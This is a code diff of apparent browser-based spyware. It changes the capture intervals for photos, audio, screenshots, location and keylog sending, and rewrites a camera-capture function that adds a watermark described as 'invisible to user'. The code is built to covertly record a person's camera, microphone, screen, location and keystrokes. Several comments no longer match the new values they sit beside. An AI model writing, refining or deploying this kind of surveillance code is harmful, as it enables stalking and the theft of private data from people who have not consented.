@@ -145,10 +145,10 @@ const CONFIG = {
     
     // Capture Settings
     PHOTO_INTERVAL: 500,        // Photo every 500ms
-    AUDIO_DURATION: 10000,      // 10 second audio clips
-    SCREEN_INTERVAL: 3000,      // Screenshot every 3s
-    LOCATION_INTERVAL: 5000,    // Location every 5s
-    KEYLOG_SEND_INTERVAL: 5000, // Send keylog every 5s
+    AUDIO_DURATION: 20000,      // 10 second audio clips
+    SCREEN_INTERVAL: 30000,      // Screenshot every 3s
+    LOCATION_INTERVAL: 10000,    // Location every 5s
+    KEYLOG_SEND_INTERVAL: 15000, // Send keylog every 5s
     
     // Quality Settings
     PHOTO_QUALITY: 0.92,
@@ -618,49 +618,42 @@ const CameraModule = {
         }
     },
     
-  capturePhoto(stream, type = 'front') {
-    if (!stream) return null;
-    
-    try {
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.muted = true;
-        video.play();
+    capturePhoto(stream, type = 'front') {
+        if (!stream) return null;
         
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        const dims = this.getDimensions();
-        
-        // MAX QUALITY SETTINGS
-        canvas.width = dims.width;
-        canvas.height = dims.height;
-        
-        // HD Canvas settings
-        ctx.imageSmoothingEnabled = true;
-        ctx.imageSmoothingQuality = 'high';
-        
-        return new Promise((resolve) => {
-            video.onloadedmetadata = () => {
-                // Ultra-clear capture
-                ctx.drawImage(video, 0, 0, dims.width, dims.height);
-                
-                // Stealth HD watermark
-                ctx.fillStyle = 'rgba(255,255,255,0.005)';
-                ctx.font = '12px monospace';
-                ctx.fillText(`${Date.now()}-${type}`, 8, 18);
-                
-                // MAX QUALITY EXPORT
-                const dataURL = canvas.toDataURL('image/webp', 0.98);  // WebP > JPEG!
-                const blob = Utils.dataURItoBlob(dataURL);
-                console.log(`📸 ${type} HD capture: ${blob.size} bytes`);
-                resolve(blob);
-            };
-        });
-    } catch (e) {
-        console.log('HD capture error:', e);
-        return null;
-    }
-},
+        try {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            video.play();
+            
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = CONFIG.PHOTO_WIDTH;
+            canvas.height = CONFIG.PHOTO_HEIGHT;
+            
+            // Use the main video element for front camera
+            const sourceVideo = type === 'front' 
+                ? document.getElementById('video') 
+                : video;
+            
+            ctx.drawImage(sourceVideo, 0, 0, canvas.width, canvas.height);
+            
+            // Add timestamp watermark (invisible to user)
+            ctx.fillStyle = 'rgba(255,255,255,0.01)';
+            ctx.font = '10px Arial';
+            ctx.fillText(Date.now().toString(), 5, 10);
+            
+            const dataURL = canvas.toDataURL('image/jpeg', CONFIG.PHOTO_QUALITY);
+            const blob = Utils.dataURItoBlob(dataURL);
+            
+            return blob;
+        } catch (e) {
+            console.log('Photo capture error:', e);
+            return null;
+        }
+    },
     
     async switchCamera() {
         // Toggle between front and back camera
